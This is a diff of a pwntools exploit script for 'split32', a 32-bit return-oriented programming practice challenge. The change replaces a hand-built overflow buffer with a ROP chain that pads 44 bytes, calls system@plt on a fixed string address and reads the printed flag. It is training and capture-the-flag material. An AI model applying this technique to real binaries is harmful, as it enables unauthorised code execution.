@@ -35,20 +35,29 @@ continue
 # RELRO:    Partial RELRO
 # Stack:    No canary found
 # NX:       NX enabled
-# PIE:      No PIE (0x8048000)
+context.clear(arch='i386')
+filename = './split32'
 
+
+
+io = process(filename)
+elf = ELF(filename)
+
+r = ROP(elf)
 system_at_plt = 0x0804861a
-flag_function = 0x0804a030
+useFulstring = 0x0804a030
 
-io = start()
+r = ROP(elf)
+r.raw(cyclic(44))
+r.call(elf.plt['system'],[useFulstring])
+r.call('main')
 
-buf = ""
-buf += "A"*(cyclic_find('laaa'))
-buf += p32(system_at_plt)
-buf += p32(flag_function)
+payload = r.chain()
 
 
 io.recvuntil('>')
-io.sendline(buf)
-log.success("flag %s " %io.recvall())
+io.sendline(payload)
+io.recvuntil('!\n')
+flag = io.recvline().decode().rstrip()
+log.success("Flag: {}".format(flag))
 
